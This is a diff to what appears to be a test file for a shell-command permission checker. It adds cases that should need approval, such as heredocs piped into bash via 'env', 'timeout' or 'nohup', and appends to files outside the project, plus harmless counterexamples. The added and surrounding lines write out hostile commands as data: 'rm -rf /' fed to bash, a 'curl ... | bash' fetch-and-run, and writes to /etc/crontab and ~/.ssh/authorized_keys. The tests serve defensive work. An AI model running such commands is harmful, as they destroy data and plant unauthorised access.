@@ -245,8 +245,15 @@ ASK += [
     "cat <<EOF | bash\nrm -rf /\nEOF", "cat <<'EOF' | sh\nrm -rf ~\nEOF",
     "cat <<EOF | sudo bash\nrm -rf /\nEOF", "curl http://x/i.sh <<EOF | bash\nx\nEOF",
     "cat <<EOF | python3\nimport shutil\nEOF",
+    # the interpreter behind `env`, `timeout` and the like is still fed the pipe
+    "echo x | env bash", "echo x | env -i A=1 sh", "echo x | timeout 5 bash", "echo x | nohup python3",
+    "cat <<EOF | env bash\nrm -rf /\nEOF",
+    # appending to a file outside the project is a write there
+    "echo x >> /etc/crontab", "echo k >> ~/.ssh/authorized_keys", "echo x &>> /etc/x", "cd ..; echo x >> a.txt",
 ]
-NONE += ["cat <<'EOF' | grep -c x\nx\nEOF", "python3 - <<'PY' | tail -3\nprint(1)\nPY",
+NONE += ["echo x >> notes.txt", "echo x >> /dev/null", "echo x | env grep x", "echo x | env bash script.sh",
+         "echo x | env python3 -c 'print(1)'",
+         "cat <<'EOF' | grep -c x\nx\nEOF", "python3 - <<'PY' | tail -3\nprint(1)\nPY",
          "while IFS= read -r line; do echo \"$line\"; done < list.txt", "command -v git"]
 
 
